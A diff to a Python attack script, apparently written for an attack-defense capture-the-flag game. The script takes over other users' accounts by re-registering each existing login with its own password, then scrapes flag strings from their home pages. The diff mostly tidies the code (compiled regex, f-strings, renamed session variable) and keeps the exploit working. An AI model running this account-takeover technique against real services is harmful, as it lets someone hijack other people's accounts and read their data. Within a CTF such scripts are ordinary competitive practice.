@@ -7,12 +7,13 @@ import random
 import json
 import hashlib
 
-flagRegEx = "[2-7A-Z]{31}="
+flagRegEx = re.compile(r'[A-Za-z0-9]{31}=')
 
 our_host = "10.80.3.2"		# define out host
 port = 37000 				# define port of service
 
 alph = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789'
+printable = string.printable
 
 # POST requests
 # data = { 'key':'value', 'key1':'value1' }
@@ -22,12 +23,13 @@ def md5(data): return hashlib.md5(data).hexdigest()
 def sha1(data): return hashlib.sha1(data).hexdigest()
 def sha256(data): return hashlib.sha256(data).hexdigest()
 
+
 def main():
-	
+
 	# do not forgot about strip(), split(), replace() - functions to parsing
 
-	host = "10.80.4.2"		# DEBUG mode
-	url = host = 'http://{}:{}/'.format(host, port)
+	host = "10.80.4.2"				# DEBUG mode
+	url = f'http://{host}:{port}/'
 	
 	u_name = idgen(8)
 	u_pswd = idgen(12)
@@ -35,20 +37,20 @@ def main():
 	# print(u_name, u_pswd)
 
 	register(u_name, u_pswd)
-	s = login(u_name, u_pswd)
-	logins = get_logins(s)
+	sess = login(u_name, u_pswd)
+	logins = get_logins(sess)
 
 	# print(logins)
 
 	for u_name in logins:
 
 		register(u_name, u_pswd)
-		s = login(u_name, u_pswd)
-		home = s.get(url).text
-		flag_list = re.findall( flagRegEx, home )
+		sess = login(u_name, u_pswd)
+		home = sess.get(url).text
+		flag_list = flagRegEx.findall( home )
 		
 		print(*flag_list, sep="\n", flush=True)
-		sys.stdout.flush() # after print
+		sys.stdout.flush() 	# after print
 
 
 def idgen( size = 8, chars=alph ):
@@ -56,12 +58,24 @@ def idgen( size = 8, chars=alph ):
 
 
 def register(u_name: str, u_pswd: str):
-	resp = requests.post(url+"api/register", json={"login":u_name,"password":u_pswd}).text
+	resp = requests.post(
+		url+"api/register",
+		json={
+			"login": u_name,
+			"password": u_pswd
+		}
+	).text
 
 
 def login(u_name: str, u_pswd: str):
 	s = requests.Session()
-	resp = s.post(url+"api/login", json={"login":u_name,"password":u_pswd}).text
+	resp = s.post(
+		url+"api/login",
+		json={
+		"login": u_name,
+		"password": u_pswd
+		}
+	).text
 	return s
 
 
@@ -78,7 +92,7 @@ if __name__ == '__main__':
 	if len(sys.argv) > 1:
 		host = sys.argv[1]
 	else:
-		print("Usage python3 " + sys.argv[0] + " <host>")
+		print(f"Usage: python3 {sys.argv[0]} <host>")
 		sys.exit(-1)
 	
 	if host == our_host:
